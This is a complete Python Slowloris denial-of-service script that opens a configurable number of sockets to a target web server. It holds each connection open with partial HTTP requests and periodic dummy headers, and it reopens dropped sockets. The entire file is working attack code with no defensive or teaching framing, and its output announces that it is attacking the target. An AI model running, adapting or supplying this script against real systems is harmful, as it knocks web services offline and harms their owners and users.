#!/usr/bin/env python3
import socket
import time
import sys

# Arguments
if len(sys.argv) < 4:
    print("Usage: python3 slowloris.py <target> -p <port> -s <sockets>")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[3]) if sys.argv[2] == "-p" else 80
num_sockets = int(sys.argv[5]) if len(sys.argv) > 5 and sys.argv[4] == "-s" else 150

# Store all sockets
sockets = []

# Create a socket connection to the target
def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((target, port))
    s.send(b"GET / HTTP/1.1\r\n")
    return s

# Initialize sockets
print(f"[+] Attacking {target} with {num_sockets} sockets")
for i in range(num_sockets):
    try:
        s = create_socket()
        sockets.append(s)
    except Exception as e:
        print(f"Failed to create socket {i}: {e}")

# Keep connections alive
while True:
    print(f"[+] Sending keep-alive headers... Socket count: {len(sockets)}")
    for s in sockets:
        try:
            s.send(b"X-a: b\r\n")
        except Exception:
            # Remove dead sockets and recreate
            sockets.remove(s)
            try:
                s = create_socket()
                sockets.append(s)
            except:
                pass
    time.sleep(15)
